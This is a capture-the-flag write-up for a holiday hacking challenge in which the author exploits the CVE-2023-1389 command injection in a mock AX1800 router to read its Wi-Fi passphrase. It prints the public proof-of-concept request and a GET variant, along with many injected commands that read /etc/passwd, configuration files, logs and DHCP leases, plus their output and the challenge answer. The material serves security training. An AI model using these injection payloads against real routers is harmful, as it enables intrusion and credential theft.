---
title: Dosis Network Down
tags:
  - CVE-2023-1389
Difficulty: ❄️❄️---
order: 4
showToc: true
---

👨‍💻 Challenge provided by: [[Janusz Jasinski]]  
🗺️ Location: 24-Seven - Area: 24seven. Coordinates: 10, 3  
<img src="HHC2025/images/router.png" width="18" class="inline-left"> Challenge URL: [Dosis Neighborhood Core Router](https://dosis-network-down.holidayhackchallenge.com/)

## Challenge Description

```
Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?
```

## Helpful References

[CVE-2023-1389](https://www.tenable.com/security/research/tra-2023-11)

## Solution

When accessing the challenge website, we are presented with a login screen that looks like a Wi-Fi router web interface. The page also displays the router model and firmware version:

![[dosis-network-1.png|650]]

A quick Google search for `AX1800 1.1.4 Build 20230219 rel.69802` reveals that we are dealing with a version of the firmware vulnerable to a command injection - [NVD - cve-2023-1389](https://nvd.nist.gov/vuln/detail/cve-2023-1389).

**Note**: The firmware version shown is technically patched against CVE-2023-1389. This was a typo from the challenge developer; however, it is the intended vulnerability we need to exploit for completing the challenge.

The Tenable advisory provided in the NVD link contains a PoC for the vulnerability:

```
POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1
Host: <target router>
Content-Type: application/x-www-form-urlencoded

operation=write&country=$(id>/tmp/out)
```

An important detail mentioned in the advisory is that the request must be sent twice in a row. Using the PoC, I sent the following request twice, which confirmed that we can use the vulnerability to execute commands on the router:

![[dosis-network-2.png]]

I then used `grep` to find files that could contain the password:

`operation=write&country=$(grep -r pass)`

```
grep: bin/cat: binary file matches
grep: bin/find: binary file matches
grep: bin/id: binary file matches
grep: bin/ls: binary file matches
grep: bin/pwd: binary file matches
etc/hostapd.conf:wpa_passphrase=SprinklesAndPackets2025!
grep: lib/libc.so.6: binary file matches
grep: lib/libpcre2-8.so.0: binary file matches
grep: lib/libselinux.so.1: binary file matches
```

Although the output already provided the solution, I retrieved the full `etc/hostapd.conf` file:
`operation=write&country=$(cat etc/hostapd.conf)`

```
# DOSIS-Link AX1800 Web Interface Configuration

interface=default_radio0
driver=nl80211
ssid=DOSIS-247_2.4G
hw_mode=g
channel=6
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=SprinklesAndPackets2025!
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
country_code=US
ieee80211n=1
ht_capab=[HT40][SHORT-GI-20][SHORT-GI-40]
```

Solution: ==SprinklesAndPackets2025!==

## Extras

As an alternative approach, I later found out that the exploit also works using a GET request:

```
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)
```

In addition, we can also find the password for the wireless network and therefore the solution in `/etc/config/wireless`

```
config wifi-device 'radio0'
	option type 'mac80211'
	option channel '6'
	option hwmode '11g'
	option path 'platform/ahb/18100000.wmac'
	option htmode 'HT20'
	option country 'US'

config wifi-device 'radio1'
	option type 'mac80211'
	option channel '36'
	option hwmode '11a'
	option path 'pci0000:00/0000:00:00.0'
	option htmode 'VHT80'
	option country 'US'

config wifi-iface 'default_radio0'
	option device 'radio0'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_2.4G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'

config wifi-iface 'default_radio1'
	option device 'radio1'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_5G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'
```

I enumerated the router to better understand the environment and found several interesting files, these are some of them:

`operation=write&country=$(cat%20/etc/passwd)`

```
root:x:0:0:root:/root:/bin/ash
daemon:x:1:1:daemon:/var:/bin/false
ftp:x:55:55:ftp:/home/ftp:/bin/false
network:x:101:101:network:/var:/bin/false
nobody:x:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
```

All commands available: `operation=write&country=$(ls -la /bin)`

```
-rwxr-xr-x 1 999 999  44016 Sep 16 12:39 cat
-rwxr-xr-x 1 999 999 224848 Sep 16 12:39 find
-rwxr-xr-x 1 999 999 203152 Sep 16 12:39 grep
-rwxr-xr-x 1 999 999  48144 Sep 16 12:39 id
-rwxr-xr-x 1 999 999 151344 Sep 16 12:39 ls
-rwxr-xr-x 1 999 999  43952 Sep 16 12:39 pwd
-rwxr-xr-x 1 999 999 125640 Sep 16 12:39 sh
```

`operation=write&country=$(cat /etc/config/system)`

```
	list server '0.dosis.pool.ntp.org'
	list server '1.dosis.pool.ntp.org'
	list server '2.dosis.pool.ntp.org'
	list server '3.dosis.pool.ntp.org'
```

`operation=write&country=$(cat /etc/device_info)`

```
DEVICE_MODEL="AX1800"
DEVICE_VERSION="v1.1.4"
DEVICE_BUILD="20230219 rel.69802"
ETHERNET_PORTS="4x Gigabit + 1x WAN"
SERIAL_NUMBER="DL1800231225001"
MAC_ADDRESS_BASE="FC:AA:BB:CC:DD:00"
```

`operation=write&country=$(cat /etc/hostname)`

```
DOSIS-Link-AX1800
```

`operation=write&country=$(cat /etc/hosts)`

```
127.0.0.1	localhost
192.168.1.1	DOSIS-Link-AX1800 router.local
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
```

`operation=write&country=$(cat /etc/profile)`

```
#!/bin/ash

export PATH=/bin:/sbin:/usr/bin:/usr/sbin
export HOME=/root
export USER=root
export LOGNAME=root
export SHELL=/bin/ash
export HOSTNAME=DOSIS-Link-AX1800

# DOSIS-Link Router Profile
echo "Welcome to DOSIS-Link AX1800 Router"
echo "Firmware: v1.1.4 Build 20230219 rel.69802"

alias ll='ls -l'
alias la='ls -la'
alias ..='cd ..'
alias logs='tail -f /var/log/messages'
```

`operation=write&country=$(cat /etc/resolv.conf)`

```
nameserver 127.0.0.1
nameserver 8.8.8.8
nameserver 8.8.4.4
```

`operation=write&country=$(cat /proc/version)`

```
Linux version 4.14.248 (root@dosis-build) (gcc version 7.3.0 (DOSIS Linaro GCC 7.3-2018.05)) #1 SMP Mon Dec 25 15:42:16 UTC 2023
```

`operation=write&country=$(cat /tmp/dhcp.leases)`

```
# DHCP leases file - DOSIS-Link AX1800 Router
# Format: lease_expiry mac_address ip_address hostname client_id
# Lease expiry is Unix timestamp

1735689600 b8:27:eb:a4:2f:11 192.168.1.102 Dosis-LapBook-Pro 01:b8:27:eb:a4:2f:11
1735689615 ac:bc:32:d4:5e:78 192.168.1.103 Jessica-iPhone *
1735689630 54:52:00:12:34:56 192.168.1.104 Joshua-Gaming-PC *
1735689645 08:00:27:fe:dc:ba 192.168.1.105 Smart-TV-Living-Room *
1735689660 2c:f0:5d:88:99:aa 192.168.1.106 RainForest-Repeat-Kitchen *
1735689675 dc:a6:32:11:22:33 192.168.1.107 DingDong-Doorbell-Front *
1735689690 f4:f5:d8:44:55:66 192.168.1.108 BirdBed-Thermostat *
1735689705 00:17:88:77:88:99 192.168.1.109 Philipe-Hugh-Bridge *
1735689735 28:6d:97:aa:bb:cc 192.168.1.111 Neighbors-WiFi-Extender *
1735689750 5c:cf:7f:dd:ee:ff 192.168.1.112 FredSang-SmartFridge *
1735689780 18:b4:30:12:34:ab 192.168.1.114 ePad-Kids-Room *
1735689795 9c:b6:d0:cd:ef:12 192.168.1.115 NineTenDo-Switcher *
1735689825 e4:5f:01:23:45:67 192.168.1.117 Laptop-Guest-Bedroom *
1735689840 34:97:f6:78:90:ab 192.168.1.118 Duku-Master-Bedroom *
1735689855 3c:07:54:89:ab:cd 192.168.1.119 Printer-Office *
1735689885 44:85:00:de:f0:12 192.168.1.121 Alset-Model3 *
1735689915 c8:3a:35:34:56:78 192.168.1.123 Wise-Camera-Garage *
1735689930 70:3a:cb:90:12:34 192.168.1.124 Glugle-BirdBed-Mini *
1735689960 a0:20:a6:56:78:90 192.168.1.126 Sisters-Printer-Basement *
1735689975 fc:aa:bb:cc:dd:07 192.168.1.127 COOLANT-SYSTEM-PRIMARY *
1735689990 6c:96:cf:ab:cd:ef 192.168.1.128 Flexa-Repeat-Dot-Bedroom *
1735690020 04:d9:f5:12:34:56 192.168.1.130 Kronos-Speaker-Kitchen *
1735690050 b4:75:0e:78:90:12 192.168.1.132 ShineyBlast-Living-Room *
1735690080 68:ff:7b:34:56:78 192.168.1.134 Tablet-Kitchen *
1735690095 f0:9f:c2:90:ab:cd 192.168.1.135 Smart-Doorlock-Front *
1735690110 fc:aa:bb:cc:dd:0b 192.168.1.136 THERMAL-REGULATION-HUB *
1735690125 00:50:56:ef:12:34 192.168.1.137 Security-Camera-Backyard *
1735690155 ac:87:a3:56:78:90 192.168.1.139 YBox-Series-Y *
1735690170 14:dd:a9:ab:cd:ef 192.168.1.140 Smart-Lights-Controller *
1735690185 fc:aa:bb:cc:dd:0d 192.168.1.141 CRYOGENIC-BACKUP-SYS *
1735690200 88:e9:fe:12:34:56 192.168.1.142 Neighbors-Guest-Phone *
1735690225 c0:1d:sn:0w:c0:de 192.168.1.145 OPERATION-SNOWGLOBE-COMMAND *
1735690230 20:4c:03:78:90:ab 192.168.1.144 LapBook-Sea-Office *
```

`operation=write&country=$(cat /var/log/messages)`

```
Dec 25 15:42:16 DOSIS-Link-AX1800 kernel: [    0.000000] Booting Linux on physical CPU 0x0
Dec 25 15:42:16 DOSIS-Link-AX1800 kernel: [    0.000000] Linux version 4.14.248 (root@dosis-build)
Dec 25 15:42:16 DOSIS-Link-AX1800 kernel: [    0.000000] CPU: ARMv8 Processor [410fd034] revision 4
Dec 25 15:42:17 DOSIS-Link-AX1800 user.info kernel: [    1.234567] DOSIS-Link WiFi driver initialized
Dec 25 15:42:18 DOSIS-Link-AX1800 daemon.info dnsmasq[1234]: started, version 2.85 cachesize 150
Dec 25 15:42:18 DOSIS-Link-AX1800 daemon.info dnsmasq[1234]: compile time options: IPv6 GNU-getopt DBus no-i18n IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth DNSSEC loop-detect inotify dumpfile
Dec 25 15:42:19 DOSIS-Link-AX1800 daemon.info dnsmasq-dhcp[1234]: DHCP, IP range 192.168.1.100 -- 192.168.1.250, lease time 12h
Dec 25 15:42:20 DOSIS-Link-AX1800 daemon.info hostapd: wlan0: AP-ENABLED
Dec 25 15:42:20 DOSIS-Link-AX1800 daemon.info hostapd: wlan1: AP-ENABLED
Dec 25 15:42:25 DOSIS-Link-AX1800 daemon.info dnsmasq-dhcp[1234]: DHCPDISCOVER(br-lan) b8:27:eb:a4:2f:11
Dec 25 15:42:25 DOSIS-Link-AX1800 daemon.info dnsmasq-dhcp[1234]: DHCPOFFER(br-lan) 192.168.1.102 b8:27:eb:a4:2f:11
Dec 25 15:42:25 DOSIS-Link-AX1800 daemon.info dnsmasq-dhcp[1234]: DHCPREQUEST(br-lan) 192.168.1.102 b8:27:eb:a4:2f:11
Dec 25 15:42:25 DOSIS-Link-AX1800 daemon.info dnsmasq-dhcp[1234]: DHCPACK(br-lan) 192.168.1.102 b8:27:eb:a4:2f:11 Dosis-LapBook-Pro
```

`operation=write&country=$(cat /var/log/kernel)`

```
Dec 25 15:42:16 kern.info kernel: [    0.000000] CPU: ARMv8 Processor [410fd034] revision 4
Dec 25 15:42:17 kern.info kernel: [    1.345678] eth0: DOSIS Ethernet controller initialized
Dec 25 15:42:17 kern.info kernel: [    1.456789] eth1: DOSIS WAN interface ready
```